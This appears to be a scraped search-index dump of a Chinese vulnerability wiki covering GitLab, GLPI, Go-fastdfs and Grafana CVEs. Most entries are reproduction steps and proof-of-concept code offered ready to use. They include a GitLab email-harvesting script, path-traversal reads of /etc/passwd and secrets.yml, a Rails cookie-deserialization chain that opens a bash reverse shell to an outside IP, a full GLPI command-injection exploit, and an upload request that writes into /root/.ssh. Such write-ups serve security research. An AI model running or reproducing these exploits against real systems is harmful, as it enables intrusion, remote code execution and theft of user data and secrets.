HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 212 Content-Type: application/json {\"query\":\"{\\nusers {\\nedges {\\n node {\\n username\\n email\\n avatarUrl\\n status {\\n emoji\\n message\\n messageHtml\\n }\\n }\\n }\\n }\\n }\",\"variables\":null,\"operationName\":null} 成功返回数据，造成 Gitlab的用户邮箱信息泄露 ","date":"0001-01-01","objectID":"/gitlab-graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-26413/:4:0","tags":null,"title":"","uri":"/gitlab-graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-26413/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: GitLab 13.4 - 13.6.2 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/api/graphql\" user_number = 0 headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/json\", } try: data = \"\"\" {\"query\":\"{\\\\nusers {\\\\nedges {\\\\n node {\\\\n username\\\\n email\\\\n avatarUrl\\\\n status {\\\\n emoji\\\\n message\\\\n messageHtml\\\\n }\\\\n }\\\\n }\\\\n }\\\\n }\",\"variables\":null,\"operationName\":null} \"\"\" requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data ,verify=False, timeout=5) if \"email\" in response.text and \"username\" in response.text and \"@\" in response.text and response.status_code == 200: print('\\033[32m[o] 目标{}存在漏洞, 泄露用户邮箱数据....... \\033[0m'.format(target_url)) for i in range(0,999): try: username = json.loads(response.text)[\"data\"][\"users\"][\"edges\"][i][\"node\"][\"username\"] email = json.loads(response.text)[\"data\"][\"users\"][\"edges\"][i][\"node\"][\"email\"] user_number = user_number + 1 print('\\033[34m[o] 用户名:{} 邮箱:{} \\033[0m'.format(username, email)) except: print(\"\\033[32m[o] 共泄露{}名用户邮箱账号 \\033[0m\".format(user_number)) sys.exit(0) else: print(\"\\033[31m[x] 不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/gitlab-graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-26413/:5:0","tags":null,"title":"","uri":"/gitlab-graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-26413/"},{"categories":null,"content":"GitLab SSRF漏洞 CVE-2021-22214 ","date":"0001-01-01","objectID":"/gitlab-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-22214/:0:0","tags":null,"title":"","uri":"/gitlab-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-22214/"},{"categories":null,"content":"漏洞描述 GitLab存在前台未授权SSRF漏洞，未授权的攻击者也可以利用该漏洞执行SSRF攻击（CVE-2021-22214）。该漏洞源于对用户提供数据的验证不足，远程攻击者可通过发送特殊构造的 HTTP 请求，欺骗应用程序向任意系统发起请求。攻击者成功利用该漏洞可获得敏感数据的访问权限或向其他服务器发送恶意请求。 ","date":"0001-01-01","objectID":"/gitlab-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-22214/:1:0","tags":null,"title":"","uri":"/gitlab-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-22214/"},{"categories":null,"content":"漏洞影响 Gitlab \u003e 10.5 ","date":"0001-01-01","objectID":"/gitlab-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-22214/:2:0","tags":null,"title":"","uri":"/gitlab-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-22214/"},{"categories":null,"content":"网络测绘 app=\"GitLab\" ","date":"0001-01-01","objectID":"/gitlab-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-22214/:3:0","tags":null,"title":"","uri":"/gitlab-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-22214/"},{"categories":null,"content":"环境搭建 http://vulfocus.fofa.so/ ","date":"0001-01-01","objectID":"/gitlab-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-22214/:4:0","tags":null,"title":"","uri":"/gitlab-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-22214/"},{"categories":null,"content":"漏洞复现 登录页面如下 发送请求包 POST /api/v4/ci/lint HTTP/1.1 Host: User-Agent: python-requests/2.25.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: application/json Content-Length: 111 {\"include_merged_yaml\": true, \"content\": \"include:\\n remote: http://965qaw.dnslog.cn/api/v1/targets?test.yml\"} ","date":"0001-01-01","objectID":"/gitlab-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-22214/:5:0","tags":null,"title":"","uri":"/gitlab-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-22214/"},{"categories":null,"content":"GitLab 任意文件读取导致RCE CVE-2020-10977 ","date":"0001-01-01","objectID":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/:0:0","tags":null,"title":"","uri":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/"},{"categories":null,"content":"漏洞描述 GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的web服务。GitLab是由GitLabInc.开发，使用MIT许可证的基于网络的Git仓库管理工具，且具有wiki和issue跟踪功能。 参考链接： Hackone-Arbitrary file read via the UploadsRewriter when moving and issue CVE-2020-10977-Gitlab CE/EE 任意文件读取导致远程命令执行漏洞 ","date":"0001-01-01","objectID":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/:1:0","tags":null,"title":"","uri":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/"},{"categories":null,"content":"漏洞影响 GitLab GitLab EE \u003e=8.5，\u003c=12.9 GitLab GitLab CE \u003e=8.5，\u003c=12.9 ","date":"0001-01-01","objectID":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/:2:0","tags":null,"title":"","uri":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/:3:0","tags":null,"title":"","uri":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/"},{"categories":null,"content":"环境安装 yum -y install policycoreutils openssh-server openssh-clients postfix 分配给虚拟机的物理内存最好是4G。 下载gitlab安装包 CE下载地址：https://packages.gitlab.com/gitlab/gitlab-ce EE下载地址：https://packages.gitlab.com/gitlab/gitlab-ee 安装 yum -y install ./gitlab......12_8.1.rpm 修改监听端口 vim /etc/gitlab/gitlab.rb external_url 'http://localhost:8888' 重置和重启 gitlab-ctl reconfigure gitlab-ctl restart 第一次进入会提示重置root密码 ","date":"0001-01-01","objectID":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/:3:1","tags":null,"title":"","uri":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/"},{"categories":null,"content":"任意文件读取漏洞复现 创建两个项目（test1 和 test2） 在test1中新建一个issue。 内容为： ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd) 创建好后，将这个issue移动到test2。 如果漏洞存在，并且文件有可读权限，就会变成一个链接。因为/etc/passwd被复制到了 /var/opt/gitlab/gitlab-rails/uploads/@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/ed7e8cddbc49e3746e0b9974b5393d79/passwd ","date":"0001-01-01","objectID":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/:3:2","tags":null,"title":"","uri":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/"},{"categories":null,"content":"RCE漏洞复现 根据报告Hackone-Arbitrary file read via the UploadsRewriter when moving and issue 内容，需要修改cookie，并且读取目标机器上的secret.yaml，并在本地搭建一个gitlab，将本地的gitlab环境的secret.yaml替换为目标机器上的secret.yaml，然后用gitlab的工具来生成cookie，最后携带这段cookie直接请求目标gitlab环境即可。 这里我受害机环境使用的是HackTheBox靶机Laboratory 步骤1 利用LFI漏洞先读取secrets.yaml，来获取secret_key_base字段。 ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml) 需要将本地的gitlab的secrets.yaml的secret_key_base字段替换为受害机的。 secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3 进入rails console： gitlab-rails console 使用gitlab-rails console执行以下命令，在获取到cookie之前，这些命令会在本机执行一次，所以在拿到cookie之后再监听端口。 request = ActionDispatch::Request.new(Rails.application.env_config) request.env[\"action_dispatch.cookies_serializer\"] = :marshal cookies = request.cookie_jar erb = ERB.new(\"\u003c%= `bash -c 'bash -i \u003e\u0026 /dev/tcp/10.248.245.171/9999 0\u003e\u00261'` %\u003e\") depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \"@result\", ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie] ","date":"0001-01-01","objectID":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/:3:3","tags":null,"title":"","uri":"/gitlab-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%AF%BC%E8%87%B4rce-cve-2020-10977/"},{"categories":null,"content":"GLPI htmLawedTest.php 远程命令执行漏洞 CVE-2022-35914 ","date":"0001-01-01","objectID":"/glpi-htmlawedtest.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-35914/:0:0","tags":null,"title":"","uri":"/glpi-htmlawedtest.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-35914/"},{"categories":null,"content":"漏洞描述 GLPI是个人开发者的一款开源IT和资产管理软件。该软件提供功能全面的IT资源管理接口，你可以用它来建立数据库全面管理IT的电脑，显示器，服务器，打印机，网络设备，电话，甚至硒鼓和墨盒等。GLPI 10.0.2及之前版本存在安全漏洞，该漏洞源于htmlawed 模块中的 /vendor/htmlawed/htmlawed/htmLawedTest.php 允许 PHP 代码注入。 ","date":"0001-01-01","objectID":"/glpi-htmlawedtest.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-35914/:1:0","tags":null,"title":"","uri":"/glpi-htmlawedtest.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-35914/"},{"categories":null,"content":"漏洞影响 GLPI 10.0.2及之前版本 ","date":"0001-01-01","objectID":"/glpi-htmlawedtest.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-35914/:2:0","tags":null,"title":"","uri":"/glpi-htmlawedtest.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-35914/"},{"categories":null,"content":"网络测绘 title=\"GLPI\" ","date":"0001-01-01","objectID":"/glpi-htmlawedtest.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-35914/:3:0","tags":null,"title":"","uri":"/glpi-htmlawedtest.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-35914/"},{"categories":null,"content":"漏洞复现 登录页面 出现问题的文件为 htmLawedTest.php， 来源于第三方库 PHP Labware https://www.bioinformatics.org/phplabware/internal_utilities/htmLawed/ 在 htmLawedTest.php 中接收参数并传入方法 htmLawed 中 跟进文件 htmLawed.php 中 if($C['hook']){$t = $C['hook']($t, $C, $S);} 这里可以看到参数均为用户可控参数，当控制参数 hhook 为 exec 和 text 为执行的命令时就导致了命令执行漏洞 验证POC /vendor/htmlawed/htmlawed/htmLawedTest.php 访问页面获取到 sid 与 token 后再发送请求包 POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1 Host: Accept: */* Accept-Encoding: gzip, deflate Content-Length: 88 Content-Type: application/x-www-form-urlencoded token=a79cf121bde57fe0e3cc0f247f77961a\u0026text=id\u0026hhook=exec\u0026sid=h1c0vk004dvulal5nj8i6en44e ","date":"0001-01-01","objectID":"/glpi-htmlawedtest.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-35914/:4:0","tags":null,"title":"","uri":"/glpi-htmlawedtest.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-35914/"},{"categories":null,"content":"漏洞POC https://github.com/cosad3s/CVE-2022-35914-poc #!/usr/bin/python # -*- coding: utf-8 -*- import argparse from bs4 import BeautifulSoup import requests import sys import re requests.packages.urllib3.disable_warnings() RED = '\\x1b[91m' BLUE = '\\033[94m' GREEN = '\\033[32m' ENDC = '\\033[0m' banner=\"\"\" ______ _______ ____ ___ ____ ____ _________ ___ _ _ _ / ___\\ \\ / / ____| |___ \\ / _ \\___ \\|___ \\ |___ / ___|/ _ \\/ | || | | | \\ \\ / /| _| _____ __) | | | |__) | __) |____ |_ \\___ \\ (_) | | || |_ | |___ \\ V / | |__|_____/ __/| |_| / __/ / __/_____|__) |__) \\__, | |__ _| \\____| \\_/ |_____| |_____|\\___/_____|_____| |____/____/ /_/|_| |_| \"\"\" def main(): print(banner) parser = argparse.ArgumentParser(description='CVE-2022-35914 - GLPI - Command injection using a third-party library script') parser.add_argument('-u', type=str, required=True, dest='url', help = \"URL to test\") parser.add_argument('-c', type=str, required=False, dest='cmd', default = \"id\", help = \"Command to launch (default: id)\") parser.add_argument('-f', type=str, required=False, dest='hook', default = \"exec\", help = \"PHP hook function (default: exec)\") parser.add_argument('--check', action=\"store_true\", dest='check', help = \"Just check, no command execution.\") parser.add_argument('--user-agent', type=str, required=False, default=\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36\", dest='user_agent', help = \"Custom User-Agent\") args = parser.parse_args() exploit(args.url, args.cmd, args.user_agent,args.check,args.hook) def exploit(url,cmd,user_agent,check,hook): uri = \"/vendor/htmlawed/htmlawed/htmLawedTest.php\" headers = {'User-Agent': user_agent} session = requests.Session() response_part1 = session.get(str(url)+uri, verify=False, headers=headers) if (response_part1.status_code != 200): fail() soup = BeautifulSoup(response_part1.text, 'html.parser') if (soup.title.text.find(\"htmLawed\") == -1): fail() if (check): print(GREEN + \"[+] Server potentially vulnerable to CVE-2022-35914\" + ENDC) sys.exit() # Prepare POST request token_value = soup.find_all(id='token')[0]['value'] sid_value = session.cookies.get(\"sid\") body = {\"token\":token_value,\"text\":cmd,\"hhook\":hook,\"sid\":sid_value} response_part2 = session.post(str(url)+uri, verify=False, headers=headers, data=body) parse(response_part2.text) def parse(response): soup = BeautifulSoup(response, 'html.parser') raw = soup.find_all(id='settingF')[0] return_code_search_regex = \"\\$spec\\: (.*)\" found_return_code = re.search(return_code_search_regex, raw.text, re.DOTALL).group(1) output_search_regex = \"\\[xml:lang\\] \\=\\\u003e 0\\n(.*)\\n\\)\" found_output = re.search(output_search_regex, raw.text, re.DOTALL) print(GREEN + \"[+] Command output (Return code: \" + found_return_code + \"):\" + ENDC) if (found_output != None): raw_output = found_output.group(1) cleaning_regex = \".*\\=\\\u003e\" cleaned_output = re.sub (cleaning_regex, \"\", raw_output) print(cleaned_output) def fail(): print(RED + \"[-] Server not vulnerable to CVE-2022-35914\" + ENDC) sys.exit() if __name__ == '__main__': main() ","date":"0001-01-01","objectID":"/glpi-htmlawedtest.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-35914/:5:0","tags":null,"title":"","uri":"/glpi-htmlawedtest.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-35914/"},{"categories":null,"content":"Go-fastdfs GetClientIp 未授权访问漏洞 ","date":"0001-01-01","objectID":"/go-fastdfs-getclientip-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/go-fastdfs-getclientip-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Go-fastdfs GetClientIp方法存在XFF头绕过漏洞，攻击者通过漏洞可以未授权调用接口，获取配置文件等敏感信息 ","date":"0001-01-01","objectID":"/go-fastdfs-getclientip-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/go-fastdfs-getclientip-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Go-fastdfs ","date":"0001-01-01","objectID":"/go-fastdfs-getclientip-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/go-fastdfs-getclientip-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"go-fastdfs\" ","date":"0001-01-01","objectID":"/go-fastdfs-getclientip-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/go-fastdfs-getclientip-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 调用读取配置接口，返回 ip 不允许访问 /group1/reload?action=get 追踪错误信息代码 跟一下 GetClientIp方法，这里会从 X-Forwarded-For 等参数获取值 回到调用的起点，验证方法为调用 IsPeer 参数 这里主要是验证获取到的值是否为配置中的 AdminIps 在配置文件 cfg.json 中 admin_ips 默认为 127.0.0.1 (可被爆破) 所以通过设置 X-Forwarded-For 就可以绕过接口调用限制，执行修改配置文件等操作，验证POC /group1/reload?action=get X-Forwarded-For: 127.0.0.1 ","date":"0001-01-01","objectID":"/go-fastdfs-getclientip-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/go-fastdfs-getclientip-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Go-fastdfs upload 任意文件上传漏洞 CVE-2023-1800 ","date":"0001-01-01","objectID":"/go-fastdfs-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-1800/:0:0","tags":null,"title":"","uri":"/go-fastdfs-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-1800/"},{"categories":null,"content":"漏洞描述 Go-fastdfs upload 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器中，攻击服务器 ","date":"0001-01-01","objectID":"/go-fastdfs-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-1800/:1:0","tags":null,"title":"","uri":"/go-fastdfs-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-1800/"},{"categories":null,"content":"漏洞影响 Go-fastdfs ","date":"0001-01-01","objectID":"/go-fastdfs-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-1800/:2:0","tags":null,"title":"","uri":"/go-fastdfs-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-1800/"},{"categories":null,"content":"网络测绘 \"go-fastdfs\" ","date":"0001-01-01","objectID":"/go-fastdfs-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-1800/:3:0","tags":null,"title":"","uri":"/go-fastdfs-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-1800/"},{"categories":null,"content":"漏洞复现 主页面 验证POC POST /group1/upload HTTP/1.1 Host: Content-Length: 951 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryigj9M9EJykZc9u53 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundaryigj9M9EJykZc9u53 Content-Disposition: form-data; name=\"file\"; filename=\"id\" Content-Type: application/octet-stream test ------WebKitFormBoundaryigj9M9EJykZc9u53 Content-Disposition: form-data; name=\"scene\" default ------WebKitFormBoundaryigj9M9EJykZc9u53 Content-Disposition: form-data; name=\"filename\" id_rsa ------WebKitFormBoundaryigj9M9EJykZc9u53 Content-Disposition: form-data; name=\"output\" json2 ------WebKitFormBoundaryigj9M9EJykZc9u53 Content-Disposition: form-data; name=\"path\" ../../../../../root/.ssh ------WebKitFormBoundaryigj9M9EJykZc9u53 Content-Disposition: form-data; name=\"code\" ------WebKitFormBoundaryigj9M9EJykZc9u53 Content-Disposition: form-data; name=\"auth_token\" ------WebKitFormBoundaryigj9M9EJykZc9u53 Content-Disposition: form-data; name=\"submit\" upload ------WebKitFormBoundaryigj9M9EJykZc9u53-- ","date":"0001-01-01","objectID":"/go-fastdfs-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-1800/:4:0","tags":null,"title":"","uri":"/go-fastdfs-upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-1800/"},{"categories":null,"content":"Grafana mysql 后台任意文件读取漏洞 CVE-2019-19499 ","date":"0001-01-01","objectID":"/grafana-mysql-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-19499/:0:0","tags":null,"title":"","uri":"/grafana-mysql-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-19499/"},{"categories":null,"content":"漏洞描述 Grafana 是一个用于分析、监控和数据可视化的开源应用程序。数以千计的公司使用 Grafana，包括 PayPal、eBay 和 Intel 等主要代表。通过登录后台设置Mysql可以读取服务器中的任意文件 ","date":"0001-01-01","objectID":"/grafana-mysql-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-19499/:1:0","tags":null,"title":"","uri":"/grafana-mysql-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-19499/"},{"categories":null,"content":"漏洞影响 Grafana \u003c 6.4.4 ","date":"0001-01-01","objectID":"/grafana-mysql-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-19499/:2:0","tags":null,"title":"","uri":"/grafana-mysql-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-19499/"},{"categories":null,"content":"环境搭建 docker pull grafana/grafana:6.4.3 docker run -d --name=grafana -p 3000:3000 grafana/grafana:6.4.3 ","date":"0001-01-01","objectID":"/grafana-mysql-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-19499/:3:0","tags":null,"title":"","uri":"/grafana-mysql-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-19499/"},{"categories":null,"content":"漏洞复现 登录后台 admin/admin, 添加数据源 Mysql 修复漏洞参考 修复部分为 database数据库名的用户可控部分，由于 allowAllFiles=true 参数可以禁用对 LOCAL INFILE 请求的保护，再通过之前有关Mysql任意文件读取的漏洞即可获取服务器中的任意文件 再创建一个恶意Mysql： https://github.com/allyshka/Rogue-MySql-Server 执行 Save 即可读取文件 ","date":"0001-01-01","objectID":"/grafana-mysql-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-19499/:4:0","tags":null,"title":"","uri":"/grafana-mysql-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2019-19499/"},{"categories":null,"content":"Grafana plugins 任意文件读取漏洞 CVE-2021-43798 ","date":"0001-01-01","objectID":"/grafana-plugins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43798/:0:0","tags":null,"title":"","uri":"/grafana-plugins-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43798/"},{"categories":null,"content":"漏洞描述 Grafana存在任意文件读取漏洞，通过默认存在的插件，可构造特殊的请求包读取服务器任意文件 